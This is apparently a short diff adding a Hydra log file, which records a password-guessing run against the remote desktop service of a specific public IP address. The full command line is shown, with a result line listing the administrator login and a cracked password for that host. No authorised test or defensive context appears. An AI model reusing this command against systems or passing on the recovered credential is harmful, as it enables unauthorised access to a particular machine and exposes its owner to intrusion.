@@ -1,0 +1,2 @@
+# Hydra v9.2 run at 2026-08-01 12:56:13 on 103.24.230.93 rdp (hydra -l administrator -P /tmp/precise_pass.txt -t 1 -W 3 -o /tmp/rdp_cnhpbxg.txt rdp://103.24.230.93)
+[3389][rdp] host: 103.24.230.93   login: administrator   password: Bjry168123
